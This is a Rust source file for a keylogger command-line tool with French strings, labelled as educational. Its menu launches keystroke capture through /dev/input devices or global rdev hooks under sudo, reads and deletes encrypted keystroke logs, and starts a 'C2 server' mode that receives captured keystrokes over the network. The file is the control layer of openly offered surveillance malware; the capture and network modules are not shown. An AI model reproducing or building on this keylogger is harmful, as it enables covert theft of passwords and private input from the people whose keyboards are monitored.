mod config;
mod modules;

use modules::key_manager::get_or_create_key;
use std::io::{self, Write};
use clap::{Parser, Subcommand};
use colored::Colorize;
use inquire::Select;
use std::process::Command;
use std::env;

/// 🎯 Keylogger CLI — à usage éducatif uniquement
#[derive(Parser)]
#[command(name = "Keylogger")]
#[command(about = "Capture et chiffre les frappes clavier", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Menu interactif
    Start {
        #[arg(short, long, default_value = "auto")]
        device: String,
    },

    /// Lancement direct du keylogger (appelé par le menu)
    Run {
        #[arg(short, long, default_value = "auto")]
        device: String,
    },

    /// Lecture directe des logs (appelé par le menu)
    Read {
        #[arg(short, long, default_value = "logs.enc")]
        file: String,
    },
}

fn main() {
    println!("{}", "  _  __          _                 ".yellow());
    println!("{}", " | |/ /___ _   _| | ___  ___ _ __  ".yellow());
    println!("{}", " | ' // _ \\ | | | |/ _ \\/ _ \\ '__| ".yellow());
    println!("{}", " | . \\  __/ |_| | |  __/  __/ |    ".yellow());
    println!("{}", " |_|\\_\\___|\\__,_|_|\\___|\\___|_|    ".yellow());
    println!();

     let cli = Cli::parse();

    match cli.command {
        Commands::Start { device } => {
            let options = vec![
                "Lancer keylogger (mode device /dev/input/)",
                "Lancer keylogger (mode global rdev)",
                "Lire les logs déchiffrés",
                "Supprimer les logs",
                "Écouter en mode serveur C2 (reçoit les frappes)",
                "Quitter",
            ];

            let ans = Select::new("📋 Que veux-tu faire ?", options).prompt();

            match ans {
                Ok(choice) => match choice {
                    "Lancer keylogger (mode device /dev/input/)" => {
                        let current_path = std::env::current_dir().unwrap();
                        let binary_path = current_path.join("target/release/keylogger-rust");

                        Command::new("xterm")
                            .arg("-hold")
                            .arg("-e")
                            .arg("bash")
                            .arg("-c")
                            .arg(format!(
                                "sudo {} run --device=auto",
                                binary_path.to_string_lossy()
                            ))
                            .spawn()
                            .expect("❌ Erreur lancement keylogger device");
                    }

                    "Lancer keylogger (mode global rdev)" => {
                        let current_path = std::env::current_dir().unwrap();
                        let binary_path = current_path.join("target/release/keylogger-rust");

                        Command::new("xterm")
                            .arg("-hold")
                            .arg("-e")
                            .arg("bash")
                            .arg("-c")
                            .arg(format!(
                                "sudo {} run --device=rdev",
                                binary_path.to_string_lossy()
                            ))
                            .spawn()
                            .expect("❌ Erreur lancement keylogger rdev");
                    }

                    "Lire les logs déchiffrés" => {
                        Command::new("xterm")
                            .arg("-e")
                            .arg("bash -c './target/release/keylogger-rust read; echo \"Appuie sur une touche pour fermer...\"; read'")
                            .spawn()
                            .expect("❌ Erreur lecture logs");
                    }

                    "Supprimer les logs" => {
                        let path = env::current_dir().unwrap().join("logs.enc");

                        if path.exists() {
                            let _ = std::fs::remove_file(&path);
                            println!("{}", "🧹 Logs supprimés !".green());
                        } else {
                            println!("{}", "❌ Aucun fichier de logs.".red());
                        }
                    }

                    "Écouter en mode serveur C2 (reçoit les frappes)" => {
                        let current_path = std::env::current_dir().unwrap();
                        let binary_path = current_path.join("target/release/keylogger-rust");

                        Command::new("xterm")
                            .arg("-hold")
                            .arg("-e")
                            .arg("bash")
                            .arg("-c")
                            .arg(format!(
                                "{} run --device=c2server",
                                binary_path.to_string_lossy()
                            ))
                            .spawn()
                            .expect("❌ Erreur lancement mode serveur C2");
                    }

                    "Quitter" => {
                        println!("{}", "🚪 Fermeture du menu.".red());
                    }

                    _ => {}
                },
                Err(_) => println!("❌ Erreur dans le menu"),
            }
        }

        Commands::Run { device } => {
            let actual_device = if device == "auto" {
                modules::logger::detect_keyboard_device().expect("❌ Aucun clavier détecté.")
            } else {
                device.clone()
            };

            println!("{}", format!("[*] Keylogger démarré sur {}", actual_device).green());

            // Si c2server, ne demande pas de passphrase
            if actual_device == "c2server" {
                modules::network::start_server();
                return;
            }

            print!(" Entrez votre passphrase : ");
            io::stdout().flush().unwrap();

            let mut passphrase = String::new();
            io::stdin().read_line(&mut passphrase).unwrap();
            let passphrase = passphrase.trim();

            let _key = get_or_create_key(passphrase);

            if actual_device == "rdev" {
                modules::logger::start_rdev_logger();
            } else {
                modules::logger::start_keylogger(&actual_device, passphrase);
            }
        }

        Commands::Read { file } => {
            println!("{}", format!("[*] Lecture du fichier {}", file).cyan());

            print!(" Entrez votre passphrase : ");
            io::stdout().flush().unwrap();

            let mut passphrase = String::new();
            io::stdin().read_line(&mut passphrase).unwrap();
            let passphrase = passphrase.trim();

            let path = env::current_dir().unwrap().join(&file);
            modules::decrypt::read_plaintext_logs();
        }
    }
}